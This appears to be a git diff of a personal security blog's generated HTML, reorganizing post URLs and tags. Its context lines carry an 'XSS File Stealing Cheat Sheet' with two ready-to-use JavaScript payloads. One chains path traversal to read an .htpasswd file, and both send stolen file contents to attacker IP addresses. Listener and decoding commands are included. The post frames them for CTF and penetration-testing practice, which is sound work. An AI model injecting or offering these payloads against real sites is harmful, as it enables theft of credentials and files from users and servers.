@@ -180,12 +180,12 @@
     <p> 1. Steal File Content Using Inline XSS Script (HTML) &lt;script&gt; fetch(&#34;http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd&#34;) .then(response =&gt; response.text()) .then(data =&gt; { fetch(&#34;http://10.10.14.228/?data=&#34; &#43; encodeURIComponent(data)); }) .catch(error =&gt; console.error(&#34;Error fetching the messages:&#34;, error)); &lt;/script&gt; Explanation: This script tries to read the .htpasswd file from a vulnerable server using a local file inclusion (LFI) or file read vulnerability in the URL parameter file. Then, it sends the stolen file content back to your attacker server (10.10.14.228) using an HTTP request with the data URL-encoded. Works in XSS vulnerable pages where you can inject JS. How to use: Inject this script into an XSS vulnerable parameter or stored XSS vector. Make sure your attacker machine (10.10.14.228) is ready to receive GET requests and log the data parameter. Example listener (using nc or a simple Python HTTP server) to capture data: nc -lvnp 80 # or python3 -m http.server 80 2. External JS File to Steal File Content via XSS (JavaScript) // Usage: // Spawn python HTTP server on attacker box: python3 -m http.server 1212 // Inject in vulnerable page: &lt;script src=&#34;http://10.9.179.230:1212/steal_page_content_xss.js&#34;&gt;&lt;/script&gt; var url = &#34;http://127.0.0.1/dir/pass.txt&#34;; // Target file on victim var attacker = &#34;http://10.9.179.230:1212/steal_page_content_xss.js&#34;; var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { // send base64 encoded stolen content to attacker server fetch(attacker &#43; &#34;?&#34; &#43; encodeURI(btoa(xhr.responseText))) } } xhr.open(&#39;GET&#39;, url, true); xhr.send(null); Explanation: This script fetches a local file on the victim machine (http://127.0.0.1/dir/pass.txt) via the victim’s browser. When the file is fully loaded (DONE), it encodes the content in Base64 (btoa) to safely transmit binary or special characters. Then sends this encoded content back to attacker server by requesting the script file with data as query string (?data=...). Requires you to host this script on your attacker machine (10.9.179.230) and have an HTTP server running on port 1212. How to use: Start HTTP server on attacker box: python3 -m http.server 1212 Inject &lt;script src=&#34;http://10.9.179.230:1212/steal_page_content_xss.js&#34;&gt;&lt;/script&gt; into an XSS vulnerable page. Monitor requests on your attacker server to capture the Base64 encoded file contents in the URL. Decode captured Base64 content: echo &#34;base64_encoded_string&#34; | base64 -d &gt; stolen_file.txt Summary Notes: These methods depend on the target browser having access to local files via URL paths (like 127.0.0.1) or vulnerable parameters (LFI). Base64 encoding helps send files safely in GET requests. Must have control over attacker server to catch stolen data. Use during CTF challenges, penetration testing, or in controlled environments. Always check the same-origin policy and CORS restrictions which may block requests in real-world targets. </p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
-  <a class="entry-link" aria-label="post link to XSS File Stealing Cheat Sheet" href="http://localhost:1313/posts/tipsandtricks/webvulnerability/xss-file-stealing-cheat-sheet/"></a>
+  <a class="entry-link" aria-label="post link to XSS File Stealing Cheat Sheet" href="http://localhost:1313/posts/penetration-testing/webvulnerability/xss-file-stealing-cheat-sheet/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">🛡️ XSS Payload Cheat Sheet
+    <h2 class="entry-hint-parent">XSS Payload Cheat Sheet
     </h2>
   </header>
   <div class="entry-content">
@@ -193,7 +193,7 @@
 </p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
-  <a class="entry-link" aria-label="post link to 🛡️ XSS Payload Cheat Sheet" href="http://localhost:1313/posts/tipsandtricks/webvulnerability/xss_payload/"></a>
+  <a class="entry-link" aria-label="post link to XSS Payload Cheat Sheet" href="http://localhost:1313/posts/penetration-testing/webvulnerability/xss_payload/"></a>
 </article>
           <div style="margin-top: auto">
             <div class="content-footer">
@@ -223,7 +223,9 @@
 
     <section>
         <h2>Trending Tags</h2>
-                                                                                                                                                                                    
+              
+        <a class="sidebar-tag" href="http://localhost:1313/tags/overthewire/"> OverTheWire </a>
+                                                                                                                                                                                                                                                            
         <a class="sidebar-tag" href="http://localhost:1313/tags/blog/"> Blog </a>
                                                                                                                                                                    
     </section>
